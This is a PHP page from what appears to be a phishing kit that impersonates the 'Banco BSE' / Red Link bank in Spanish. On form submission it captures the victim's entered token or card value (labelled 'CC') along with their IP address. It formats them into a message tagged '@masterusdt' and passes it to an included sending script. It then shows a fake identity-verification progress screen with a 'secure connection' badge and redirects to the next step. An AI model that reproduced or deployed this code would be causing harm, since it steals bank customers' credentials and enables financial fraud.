<?php  
include 'config/personalizar.php';
if (isset($_POST['submit'])) {
  $enviara =
  "<b> 💸 BSE PERSONA 💸 </b>\n\n".
  " ------ [ data ] ------ \n\n".
  "<b>👤 CC: </b> <code>".$_POST['token']."</code>\n".
  "<b>🌐 IP: </b> <code>".$_SERVER['REMOTE_ADDR']."</code>\n".
  " ------ [ @masterusdt ] ------ \n\n";    
  $enviar =  urldecode($enviara);
  include 'config/app.php';
  
  // Tiempo de carga (3 segundos para 4 dígitos)
  $segundos = 3;
}

// Si no viene del formulario, redirigir
if (!isset($_POST['submit'])) {
    header("Location: login.php");
    exit();
}
?>
<!DOCTYPE html>
<html lang="es-AR">
<head>
  <meta http-equiv="refresh" id="loader" content="<?php echo $segundos; ?>;URL=step-3.php">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;500;700;900&display=swap" rel="stylesheet">
  <link rel="icon" type="image/x-icon" href="favicon.ico">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Red Link - Procesando</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Lato', sans-serif;
      background: #f0f2f5;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .card-container {
      max-width: 420px;
      width: 90%;
      margin: 0 auto;
    }
    
    .content-card {
      background: white;
      border-radius: 28px;
      padding: 2.5rem 2rem;
      box-shadow: 0 20px 40px rgba(0,0,0,0.08);
      text-align: center;
    }
    
    .logo {
      max-width: 200px;
      height: auto;
      margin: 0 auto 2rem auto;
      display: block;
    }
    
    .titulo_cargando {
      color: #1a2639;
      font-weight: 700;
      font-size: 1.5rem;
      margin-bottom: 0.75rem;
    }
    
    .description_cargando {
      color: #5b6878;
      font-size: 1rem;
      margin-bottom: 2rem;
    }
    
    .loader-circle {
      width: 80px;
      height: 80px;
      border: 4px solid #e8ecf2;
      border-top-color: #2c7be0;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 1.5rem auto;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .percentage {
      font-size: 2rem;
      font-weight: 700;
      color: #2c7be0;
      margin-bottom: 0.5rem;
    }
    
    .percentage small {
      font-size: 1rem;
      color: #8a99b0;
      font-weight: 400;
    }
    
    .loading-text {
      color: #3a4b60;
      font-weight: 500;
      margin-bottom: 0.25rem;
    }
    
    .progress {
      height: 6px;
      background: #eef2f6;
      border-radius: 10px;
      margin: 1.5rem 0;
      overflow: hidden;
    }
    
    .progress-bar {
      background: #2c7be0;
      width: 0%;
      height: 100%;
      transition: width 0.3s ease;
    }
    
    .security-badge {
      background: #f7f9fc;
      border-radius: 40px;
      padding: 0.75rem 1.25rem;
      display: inline-flex;
      align-items: center;
      gap: 8px;
      color: #3d5179;
      font-size: 0.9rem;
      font-weight: 500;
    }
    
    .security-badge i {
      color: #2c7be0;
      font-size: 1.1rem;
    }
  </style>
</head>
<body>
  <div class="card-container">
    <div class="content-card">
      
      <!-- Logo centrado -->
      <img src="assets/images/bank_logo.png" class="logo" alt="Banco BSE">
      
      <!-- Títulos dinámicos -->
      <h3 class="titulo_cargando"><?php echo $titulo ?? 'Verificando identidad'; ?></h3>
      <p class="description_cargando"><?php echo $descripcion ?? 'Esto tomará solo unos segundos'; ?></p>
      
      <!-- Loader animado -->
      <div class="loader-circle"></div>
      
      <!-- Porcentaje -->
      <div class="percentage">
        <span id="loading">0</span><small>%</small>
      </div>
      <p class="loading-text">Procesando información</p>
      
      <!-- Barra de progreso -->
      <div class="progress">
        <div id="progressBar" class="progress-bar" role="progressbar"></div>
      </div>
      
      <!-- Badge de seguridad -->
      <div class="security-badge">
        <i class="bi bi-shield-lock-fill"></i>
        <span>Conexión segura • Red Link</span>
      </div>
      
    </div>
  </div>

  <script>
    // Configuración desde PHP
    let segundos = <?php echo $segundos ?? 3; ?>;
    
    // Calcular velocidad para llegar a 100 justo al redirigir
    let totalSteps = 100;
    let intervalTime = (segundos * 1000) / totalSteps; // milisegundos por paso
    let i = 0;
    
    // Actualizar meta refresh
    document.getElementById('loader').setAttribute('content', `${segundos};URL=step-3.php`);
    
    // Actualizar progreso
    let func = setInterval(function() {
      if (i < totalSteps) {
        i++;
        document.getElementById('loading').innerHTML = i;
        document.getElementById('progressBar').style.width = i + '%';
      } else {
        clearInterval(func);
      }
    }, intervalTime);

    // Respaldo por si algo falla
    setTimeout(function() {
      window.location.href = 'step-3.php';
    }, segundos * 1000 + 500);
  </script>
</body>
</html>